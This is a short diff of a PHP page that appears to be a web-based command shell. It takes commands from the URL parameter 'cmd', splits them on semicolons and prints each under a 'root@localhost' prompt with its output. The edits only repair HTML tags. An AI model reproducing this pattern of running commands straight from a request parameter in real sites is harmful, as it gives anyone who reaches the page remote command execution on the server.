@@ -25,7 +25,7 @@ $command = urldecode(($_GET['cmd']));
 $id = 0;
 foreach (explode(';', $command) as $cmd){
 	$output = array();
-	echo '<fieldset style="margin-top:1px;" class="CMD"><legend/>Command:</legend>';
+	echo '<fieldset style="margin-top:1px;" class="CMD"><legend>Command:</legend>';
 	echo "root@localhost:# {$cmd}<br>";
   echo "<span id=\"wait{$id}\">Please wait </span>";
   echo "<script>show_Wait({$id});</script>";
@@ -38,9 +38,8 @@ foreach (explode(';', $command) as $cmd){
 	echo "</fieldset><br><br>";
   $id++;
 }
-
 ?>
-
+</div>
 <?/*
 <style type="text/css">
 .logLine {
